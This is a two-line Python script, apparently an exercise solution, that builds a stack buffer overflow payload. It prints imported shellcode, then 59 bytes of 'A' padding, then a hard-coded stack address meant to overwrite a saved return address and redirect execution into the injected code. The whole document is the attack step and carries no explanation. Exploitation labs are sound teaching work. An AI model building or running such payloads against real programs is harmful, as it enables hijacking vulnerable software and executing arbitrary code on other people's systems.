from shellcode import shellcode
print  shellcode + "A" * 59 + b"\x4C\xFF\xFE\xBF" , 